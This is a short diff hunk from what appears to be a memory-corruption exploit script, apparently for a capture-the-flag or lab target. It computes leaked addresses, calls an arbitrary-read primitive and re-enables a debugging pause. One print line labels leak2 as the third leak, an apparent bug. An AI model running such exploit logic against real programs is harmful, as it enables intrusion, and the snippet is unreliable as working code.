@@ -108,7 +108,7 @@ def exploit(r1, r2, p):
 		location2 = leak2 + offset2
 		print("location2: ", hex(location2))
 		print(f"\nGDB: gdb -p {p.pid}")
-		#pause()	
+		pause()	
 		leak3 = arbitrary_read(r1, r2, location2, leak + 1)
 		print("Third leak: ", hex(leak2))
 
